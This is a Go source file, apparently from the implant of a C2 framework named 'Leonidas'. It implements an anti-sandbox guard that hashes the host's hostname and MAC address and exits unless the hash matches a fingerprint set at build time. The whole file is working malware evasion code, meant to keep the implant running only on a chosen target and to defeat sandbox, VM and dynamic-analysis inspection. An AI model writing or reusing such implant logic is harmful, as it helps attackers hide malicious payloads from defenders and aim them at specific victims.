package runner

/*
	Leonidas C2 Framework
	Copyright (C) 2026  Leonidas C2 Project

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.EnableFingerprintCheck}}

// Host-fingerprint anti-sandbox check.
//
// The operator specifies a target hostname (and optionally a MAC address
// prefix) at generate time. These are embedded as compile-time constants in
// the implant binary by the generate pipeline (server/generate/binaries.go).
//
// At runtime the implant derives a short fingerprint hash of the local
// hostname + MAC address and compares it against the embedded expected value.
// If they do not match the implant exits immediately — this prevents analysis
// in sandboxes, VMs, and dynamic analysis environments.
//
// Fingerprint derivation:
//   SHA-256(hostname + ":" + first-non-loopback-MAC)[0:8] → 16 hex chars
//
// The expected fingerprint is set by the -ldflags argument during build:
//   -X github.com/leonidas-c2/leonidas/implant/leonidas/runner.ExpectedFingerprint=<hex>

import (
	"crypto/sha256"
	"fmt"
	"net"
	"os"
	"strings"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// ExpectedFingerprint - Set at compile time by the generate pipeline via -ldflags.
// Format: 16 lowercase hex characters (first 8 bytes of SHA-256 hash).
var ExpectedFingerprint = "" // populated by -ldflags

// hostFingerprintMatch returns true if the running host's fingerprint matches
// the expected value embedded at build time.
// If ExpectedFingerprint is empty, the check is disabled and always passes.
func hostFingerprintMatch() bool {
	if ExpectedFingerprint == "" {
		return true
	}

	fp, err := computeHostFingerprint()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[fingerprint] error computing fingerprint: %v", err)
		// {{end}}
		return false
	}

	match := strings.EqualFold(fp, ExpectedFingerprint)

	// {{if .Config.Debug}}
	log.Printf("[fingerprint] computed=%s expected=%s match=%v", fp, ExpectedFingerprint, match)
	// {{end}}

	return match
}

// computeHostFingerprint derives the host fingerprint from hostname + first MAC.
func computeHostFingerprint() (string, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return "", err
	}

	mac := firstMACAddress()
	raw := fmt.Sprintf("%s:%s", hostname, mac)
	sum := sha256.Sum256([]byte(raw))
	return fmt.Sprintf("%016x", sum[:8]), nil
}

// firstMACAddress returns the MAC address of the first non-loopback network
// interface, or an empty string if none is found.
func firstMACAddress() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		if len(iface.HardwareAddr) == 0 {
			continue
		}
		return iface.HardwareAddr.String()
	}
	return ""
}

// {{end}} - EnableFingerprintCheck
